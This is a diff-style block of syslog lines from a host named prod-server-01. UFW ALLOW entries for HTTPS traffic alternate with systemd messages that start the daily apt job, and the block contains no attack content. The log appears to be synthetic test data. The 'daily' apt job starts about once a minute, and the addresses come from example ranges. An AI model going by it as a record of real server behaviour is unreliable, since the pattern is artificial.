+Apr 29 01:44:46 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:45:16 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:45:47 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:46:04 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:46:48 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:47:03 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:47:55 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:48:22 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:48:57 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:49:14 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:50:11 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:50:28 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:50:53 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:51:16 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:51:36 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:51:57 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:52:27 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:52:51 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:53:17 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:53:34 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:54:27 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:54:39 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:55:35 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:55:48 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:56:03 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:56:29 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:56:58 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:57:24 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:58:23 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:58:43 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:59:19 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:59:44 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:00:03 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:00:10 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:00:37 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:01:02 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:01:46 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:02:08 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:03:03 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:03:22 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:04:19 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:04:45 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:05:40 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:06:02 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:06:22 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:06:33 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:07:10 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:07:29 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:08:15 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:08:27 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:08:58 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:09:14 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:09:27 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:09:57 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:10:38 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:10:57 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:11:53 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:12:19 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:12:45 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:13:14 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:13:30 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:13:52 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:14:04 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:14:23 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:14:55 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:15:23 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:16:20 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:16:46 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:17:19 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:17:28 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:17:44 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:17:54 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:18:50 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:19:20 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:20:00 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:20:13 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:20:33 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:20:44 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:21:03 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:21:23 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:21:34 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:21:59 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:22:24 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:22:29 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:23:06 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:23:13 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:24:03 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:24:27 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:24:50 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:25:15 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:25:49 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:26:07 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:26:42 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:27:03 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:27:22 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:27:43 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:27:55 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:28:25 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:29:01 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:29:19 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:29:42 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:30:07 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:30:20 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:30:38 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:31:06 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:31:24 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:31:55 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:32:19 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:32:35 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:32:59 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:33:21 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:33:44 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:33:57 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:34:18 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:34:58 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:35:09 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:35:56 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:36:14 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:37:06 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:37:22 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:37:56 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:38:07 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:38:23 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:38:34 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:39:16 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:39:28 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:40:02 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:40:07 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:40:23 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:40:50 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:41:08 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:41:15 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:42:11 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:42:31 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:43:11 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:43:22 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:43:49 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:43:58 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:44:27 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:44:41 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:44:54 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:45:02 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:45:53 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:46:13 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:46:45 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:47:11 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:48:03 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:48:15 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:49:00 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:49:06 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:50:01 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:50:31 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:51:05 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:51:33 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:52:10 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:52:35 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:53:27 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:53:35 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:54:25 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:54:53 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:55:26 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:55:52 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:56:36 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:57:01 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:57:12 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:57:24 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:58:10 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:58:30 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 02:59:08 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 02:59:26 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:00:17 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:00:31 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:00:49 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:01:04 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:01:37 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:01:44 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:02:03 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:02:33 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:03:15 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:03:44 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:04:39 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:04:48 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:05:07 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:05:34 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:06:08 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:06:15 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:07:04 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:07:25 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:08:17 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:08:28 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:08:39 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:08:53 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:09:14 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:09:34 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:10:34 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:10:42 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:11:29 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:11:40 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:12:40 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:12:51 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:13:44 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:14:00 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:14:20 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:14:38 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:15:03 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:15:29 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:15:59 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:16:26 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:16:38 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:16:46 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:17:25 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:17:42 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:18:32 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:18:55 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:19:42 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:20:08 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:20:38 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:20:55 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:21:30 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:22:00 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:22:50 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:23:09 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:24:01 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:24:27 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:24:37 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:24:43 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:25:42 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:25:59 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:26:45 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:27:03 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:27:36 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:28:06 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:28:53 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:29:20 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:30:08 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:30:23 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:30:38 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:31:08 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:31:49 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:32:00 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:32:38 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:33:07 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:33:52 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:34:04 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:34:38 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:35:02 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:35:25 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:35:43 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:35:56 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:36:24 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:37:01 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:37:14 prod-server-01 systemd[1]: Started Daily apt download and install activities.
